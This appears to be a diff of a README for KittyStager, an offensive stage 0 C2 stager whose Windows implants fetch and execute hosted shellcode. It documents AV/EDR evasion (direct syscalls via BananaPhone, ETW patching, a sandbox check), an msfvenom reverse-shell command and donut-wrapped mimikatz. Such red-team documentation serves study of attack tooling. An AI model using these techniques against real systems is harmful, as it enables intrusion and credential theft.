@@ -8,8 +8,20 @@
 
 
 KittyStager is a simple stage 0 C2. It is made of a web server to host the shellcode and an implant, called kitten.
-The purpose of this project is to be able to have a web server and some kitten and be 
-able to use the with any shellcode.
+The purpose of this project is to be able to have a web server and some implant for various usage and be 
+able to use it the with any shellcode.
+
+KittyStager has :
+- A web server to host the shellcode
+- Some kittens (implants) to execute the shellcode
+- A simple cli to interact with the web server
+- A user agent whitelist to prevent unwanted connections
+- A basic recon to get some information about the target
+  - The hostname (used to cypher the shellcode)
+  - The username
+  - The program file content
+- An AES encryption to encrypt the shellcode with a none hardcoded key
+
 
 **I would not use this project in red team, at least not now.**
 
@@ -29,9 +41,10 @@ able to use the with any shellcode.
 2. Start the server
     1. The server will start
     2. A config file will be created with each kitten
-    3. It will configure the sleep time for the kitten
+    3. It will configure the default sleep time for the fist callback
 3. Compile the kitten
 4. Run the kitten
+5. Host the shellcode for the kitten
 
 ![](/img/workfow.svg)
 
@@ -40,20 +53,29 @@ The kittens are for windows only, but the server can be run on any OS.
 
 How to compile :
 ```
-go build -o kittyStager
+go build cmd/kitten/
 ./kittyStager
 
 cd /kitten/basickitten
 go build -o basickitten
 ./basickitten
 ```
-How to use :
-Generate a shellcode. It works with any shellcode in bin format or in hex format.
+### How to use :
+Generate a shellcode. It works with a shellcode in bin format or in hex format.
+
+#### msfvenom
 ```
 msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
+```
+#### donut
+```
 go-donut.exe -i mimikatz.exe
 ```
-The config file under `KittyStager/cmd/config` :
+#### Cobalt Strike
+Generate staged payload in raw format
+
+### Config file
+The default config file under `KittyStager/cmd/config` :
 ```yaml
 Http:
   host: "127.0.0.1"
@@ -65,6 +87,7 @@ Http:
     - "kitten/basicKitten/"
     - "kitten/bananaKitten/"
 ```
+### Example
 ```
 ~kittyStager ❯.\kittyStager.exe -p path/to/config/file
                      _
@@ -122,19 +145,17 @@ It also works with donuts shellcodes
 mimikatz #
 ```
 
-## [Kitten](/kitten/)
-The kitten is the stage 0 payload. It will be compiled and run on the target machine. The kitten will then download the shellcode and execute it.
-For the moment, they are only two kittens:
-### [BasicKitten](/kitten/basicKitten)
-This is the basic kitten, and it has the minimum to work. No fancy injection method, just a 
-`VirtualAlloc` -> `RtlCopyMemory` -> `VirtualProtect` -> `CreateThread` -> `WaitForSingleObject`. Use this as example if you want to develop your own kitten.
-### [BananaKitten](/kitten/bananaKitten)
-This is the more advanced kitten. It will use bananaphone, a variant of hell's gate implemented in Go. [https://github.com/C-Sto/BananaPhone](https://github.com/C-Sto/BananaPhone)
-It also patches etw and has a sandbox escape mechanism, that check's if there is more than 1 Gb of ram. If not, it will exit.
-
 ## Project structure
 ### [kitten](/kitten)
 This is the folder where all the kittens are stored. Each kitten has its own folder.
+#### [BasicKitten](/kitten/basicKitten)
+This is the basic kitten, and it has the minimum to work. No fancy injection method, just a
+`VirtualAlloc` -> `RtlCopyMemory` -> `VirtualProtect` -> `CreateThread` -> `WaitForSingleObject`. Use this as example if you want to develop your own kitten.
+#### [BananaKitten](/kitten/bananaKitten)
+`NtAllocateVirtualMemorySysid` -> `NtProtectVirtualMemorySysid` -> `NtCreateThreadExSysid` -> `NtWaitForSingleObject`
+This is the more advanced kitten. It will use bananaphone, a variant of hell's gate implemented in Go. [https://github.com/C-Sto/BananaPhone](https://github.com/C-Sto/BananaPhone)
+It also patches etw and has a sandbox escape mechanism, that check's if there is more than 1 Gb of ram. If not, it will exit.
+
 ### [cmd](/cmd)
 #### [kittyStager](/cmd/kittyStager)
 Main file of the project. It will start the server and create the config file for each kitten.
